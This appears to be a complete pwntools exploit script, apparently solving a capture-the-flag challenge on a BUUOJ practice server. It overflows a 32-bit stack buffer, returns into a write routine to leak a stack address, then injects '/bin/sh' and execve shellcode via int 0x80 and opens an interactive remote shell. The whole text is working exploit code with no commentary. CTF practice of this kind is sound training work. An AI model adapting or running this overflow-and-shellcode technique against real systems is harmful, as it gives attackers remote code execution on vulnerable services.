from pwn import *

context.arch = 'i386'

write_function = 0x8048087

p = remote('node4.buuoj.cn', 28128)
p.recvuntil(':')
p.send(b'a' * 0x14 + pack(write_function))
leaked_address = unpack(p.recv(4))
p.recv(16)
stack_address = leaked_address + 0x14
bin_sh_address = leaked_address - 0x4
shellcode = '''
mov eax, 0x0b
xor ecx, ecx
xor edx, edx
mov ebx, ''' + hex(bin_sh_address) + '''
int 0x80 '''
p.send(b'/bin/sh\x00' + b'a' * 0xC + pack(stack_address) + asm(shellcode))
p.interactive()